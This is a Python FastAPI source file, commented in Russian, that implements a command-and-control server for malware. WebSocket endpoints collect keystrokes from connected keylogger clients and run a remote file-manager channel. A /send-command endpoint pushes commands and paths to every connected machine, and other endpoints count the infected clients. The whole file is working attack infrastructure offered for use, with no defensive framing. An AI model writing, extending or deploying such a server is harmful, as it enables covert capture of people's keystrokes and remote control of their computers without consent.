from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from typing import List, Dict
import json
import uvicorn
from pydantic import BaseModel

app = FastAPI()

# Менеджер соединений
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, List[WebSocket]] = {"keylogger": [], "files": []}

    async def connect(self, websocket: WebSocket, channel: str):
        await websocket.accept()
        self.active_connections[channel].append(websocket)
        print(f"🔌 Новый клиент подключен к {channel}. Всего подключений: {len(self.active_connections[channel])}")

    def disconnect(self, websocket: WebSocket, channel: str):
        self.active_connections[channel].remove(websocket)
        print(f"❌ Клиент отключился от {channel}. Осталось подключений: {len(self.active_connections[channel])}")

    async def broadcast(self, message: str, channel: str):
        # Убедитесь, что канал существует, перед тем как отправить сообщение
        if channel in self.active_connections:
            for connection in self.active_connections[channel]:
                await connection.send_text(message)
        else:
            print(f"⚠ Канал {channel} не найден.")

manager = ConnectionManager()

# Веб-сокет для кейлоггеров
@app.websocket("/ws/listen/keylogger/{client_id}")
async def keylogger_websocket(websocket: WebSocket, client_id: int):
    await manager.connect(websocket, "keylogger")
    try:
        while True:
            data = await websocket.receive_text()
            print(f"📩 [Кейлоггер {client_id}] Получено сообщение: {data}")
    except WebSocketDisconnect:
        manager.disconnect(websocket, "keylogger")

# Веб-сокет для файлового менеджера
@app.websocket("/ws/listen/files_pc/{client_id}")
async def files_websocket(websocket: WebSocket, client_id: int):
    await manager.connect(websocket, "files")
    try:
        while True:
            global data
            data = await websocket.receive_text()
            print(f"📩 Получено сообщение от клиента: {data}")

            try:
                message = json.loads(data)
                action = message.get("action")

                if action == "response":
                    print(f"✅ Ответ от клиента: {message.get('data')}")
                elif action == "error":
                    print(f"⚠ Ошибка от клиента: {message.get('message')}")
                else:
                    print(f"⚠ Неизвестное действие: {message}")

            except json.JSONDecodeError:
                print(f"⚠ Ошибка обработки JSON: {data}")
    except WebSocketDisconnect:
        manager.disconnect(websocket, "files")

class CommandRequest(BaseModel):
    command: str
    path: str

@app.post("/send-command")
async def send_command(request: CommandRequest):

    command = request.command
    path = request.path
    if not manager.active_connections["files"]: 
        return {"error": "Нет подключенных клиентов к файловому каналу"}
    try:

        await manager.broadcast(json.dumps({"action": "command", "command": command, "path": path}), "files")
        return {"status": "Команда отправлена", "command": command, "path": path, "data" : data}
    except Exception as e:
        return {"error": f"Не удалось отправить команду: {str(e)}"}


@app.get("/check_keyloggers")
async def check_keyloggers():
    return {"total": len(manager.active_connections["keylogger"])}


@app.get("/check_files")
async def check_files():
    return {"total": len(manager.active_connections["files"])} 

if __name__ == "__main__":
    uvicorn.run(app, host="192.168.0.108", port=8000)
